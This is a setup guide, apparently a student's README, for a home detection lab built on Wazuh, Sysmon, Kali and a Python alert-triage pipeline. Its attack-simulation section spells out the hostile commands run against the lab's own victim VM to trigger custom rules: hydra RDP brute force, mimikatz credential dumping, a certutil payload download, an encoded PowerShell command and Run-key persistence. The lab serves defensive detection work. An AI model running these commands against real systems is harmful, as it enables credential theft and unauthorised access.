# SOC Home Lab — Setup Guide

**Stack:** Wazuh 4.7 · Docker · Windows 10 (Sysmon) · Kali Linux · Python 3.11  
**Author:** Dhruv Patel | MS Cybersecurity Engineering, USC

---

## Architecture

```
Kali Linux (attacker VM)
        │  attacks
        ▼
Windows 10 (victim VM, Sysmon installed)
        │  ships logs via Wazuh agent
        ▼
Wazuh Manager (Docker on host)
        │  stores in indexer
        ▼
Wazuh Dashboard (https://localhost)
        │
        ▼
Python pipeline (collector → triage → enrich → report)
```

---

## Phase 1 — Infrastructure

### 1.1 VirtualBox Network Setup

Create a host-only network so VMs talk to each other but not the internet:

1. VirtualBox → Tools → Network → Host-only Networks → Create
2. Set subnet: `192.168.100.0/24`, gateway: `192.168.100.1`
3. Assign both VMs to this adapter (+ NAT adapter for internet on Kali)

### 1.2 Windows 10 VM

- Disable Windows Defender real-time protection (for lab only)
- Install Sysmon with SwiftOnSecurity config:

```powershell
# Run in PowerShell as Administrator
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile Sysmon.zip
Expand-Archive Sysmon.zip -DestinationPath C:\Sysmon
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile C:\Sysmon\sysmon-config.xml
C:\Sysmon\Sysmon64.exe -accepteula -i C:\Sysmon\sysmon-config.xml
```

- Verify Sysmon is running: `Get-Service Sysmon64`

### 1.3 Kali Linux VM

Standard Kali install. Tools used in this lab:
- `hydra` — RDP brute force
- `mimikatz` (via msfconsole or direct) — credential dumping  
- `msfvenom` + `msfconsole` — payload generation, exploitation

---

## Phase 2 — Wazuh Docker Deployment

### 2.1 Prerequisites

```bash
# On your host machine (Mac/Linux)
docker --version    # 24.0+
docker compose version  # v2.20+

# Increase vm.max_map_count for Wazuh indexer (OpenSearch)
sudo sysctl -w vm.max_map_count=262144
echo "vm.max_map_count=262144" | sudo tee -a /etc/sysctl.conf
```

### 2.2 Deploy Wazuh (official single-node)

```bash
# Clone Wazuh Docker repo (uses their official certs generation)
git clone https://github.com/wazuh/wazuh-docker.git -b v4.7.3
cd wazuh-docker/single-node

# Generate SSL certificates
docker compose -f generate-indexer-certs.yml run --rm generator

# Start the stack (takes ~3 min first run)
docker compose up -d

# Check status
docker compose ps
```

Dashboard available at: **https://localhost**  
Default creds: `admin / SecretPassword`

### 2.3 Copy custom rules

```bash
# Copy your custom detection rules into the running container
docker cp ../wazuh-docker/config/custom_rules.xml \
  wazuh-manager:/var/ossec/etc/rules/local_rules.xml

# Restart manager to load rules
docker exec wazuh-manager /var/ossec/bin/wazuh-control restart
```

### 2.4 Enroll Windows Agent

On your Windows VM, download and install the Wazuh agent:

```powershell
# Replace MANAGER_IP with your host machine's IP on the host-only network
Invoke-WebRequest -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.3-1.msi" -OutFile wazuh-agent.msi
msiexec.exe /i wazuh-agent.msi WAZUH_MANAGER="192.168.100.1" WAZUH_AGENT_NAME="HOMELAB-WIN" /q

# Start agent
NET START WazuhSvc
```

Verify in dashboard: **Agents** tab should show `HOMELAB-WIN` as Active.

---

## Phase 3 — Attack Simulation

Run each attack from Kali, verify it triggers an alert in the Wazuh dashboard.

### 3.1 RDP Brute Force (T1110.001)

```bash
# From Kali — brute force RDP on Windows VM
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.100.10

# Expected: Rule 100020 triggers after 5 failures in 60s
```

### 3.2 Credential Dumping via Mimikatz (T1003.001)

```bash
# On Windows VM (PowerShell as Admin)
# Download and run mimikatz — Sysmon Event 1 + Event 10 fire
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Expected: Rule 100001 (LSASS access) or 100002 (mimikatz process name)
```

### 3.3 CertUtil LOLBin (T1218)

```powershell
# On Windows VM
certutil.exe -urlcache -split -f http://192.168.100.50:8000/payload.txt C:\Temp\payload.txt
certutil.exe -encode C:\Temp\payload.txt C:\Temp\encoded.txt

# Expected: Rule 100030
```

### 3.4 PowerShell Encoded Command (T1059.001)

```powershell
# On Windows VM
$cmd = "Write-Host 'test payload'"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -EncodedCommand $encoded

# Expected: Rule 100010
```

### 3.5 Registry Persistence (T1547.001)

```powershell
# On Windows VM
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "LabTest" -Value "C:\Temp\payload.exe"

# Expected: Rule 100050
```

---

## Phase 4 — Python Pipeline

### 4.1 Setup

```bash
cd pipeline/
pip install -r requirements.txt
cp .env.template .env
# Edit .env with your Wazuh API password and VirusTotal key
```

### 4.2 Run

```bash
# Test offline with mock data (no Wazuh needed)
python pipeline.py

# Pull last 1h of alerts from live Wazuh
python pipeline.py --hours 1 --min-level 7

# Save report to JSON
python pipeline.py --hours 24 --output reports/$(date +%Y%m%d).json
```

### 4.3 Get VirusTotal API key (free)

1. Sign up at https://www.virustotal.com/gui/join-us
2. Profile → API Key → copy key
3. Add to `.env` as `VT_API_KEY=...`
4. Free tier: 4 req/min, 500/day — enough for a home lab

---

## What Goes on Your Resume

```
SOC Detection Engineering Lab | Wazuh, Sysmon, Python, MITRE ATT&CK    2025
- Built a detection lab simulating real attack scenarios (LSASS credential
  dumping, LOLBin abuse, RDP brute force, PowerShell obfuscation) using Kali
  Linux against a Windows endpoint monitored by Sysmon and Wazuh.
- Wrote and validated 10+ custom Sigma-based detection rules mapped to MITRE
  ATT&CK, tuning for true/false positive scenarios across 6 attack techniques.
- Automated alert triage and IOC enrichment via a Python pipeline integrating
  the Wazuh REST API and VirusTotal, generating structured incident summaries.
```

---

## Project Structure

```
soc-home-lab/
├── wazuh-docker/
│   ├── docker-compose.yml          # Wazuh stack
│   └── config/
│       ├── custom_rules.xml        # Detection rules (T1003, T1059, T1110...)
│       └── wazuh_cluster/
│           └── wazuh_manager.conf  # Manager config (Sysmon log collection)
├── detections/
│   └── sigma-rules/
│       └── soc_lab_rules.yml       # Sigma rules for key scenarios
├── pipeline/
│   ├── pipeline.py                 # Main triage + enrichment + reporting
│   ├── requirements.txt
│   └── .env.template
├── reports/                        # Generated JSON reports
└── docs/
    └── SETUP.md                    # This file
```
